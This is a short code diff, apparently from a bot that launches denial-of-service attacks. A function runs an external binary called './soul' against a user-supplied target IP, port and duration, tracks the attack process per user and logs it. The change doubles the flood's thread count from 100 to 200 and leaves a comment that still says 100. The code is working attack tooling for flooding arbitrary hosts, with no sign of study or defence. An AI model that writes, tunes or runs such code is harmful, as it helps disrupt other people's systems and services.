@@ -60,7 +60,7 @@ user_data = load_user_data()
 def run_attack_command_async(user_id, target_ip, target_port, duration):
     def attack_and_notify():
         try:
-            command = ["./soul", target_ip, str(target_port), str(duration), "100"]  # Default threads set to 100
+            command = ["./soul", target_ip, str(target_port), str(duration), "200"]  # Default threads set to 100
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[user_id] = process.pid
             logging.info(f"Started attack: PID {process.pid} for User {user_id} on {target_ip}:{target_port} for {duration} seconds")
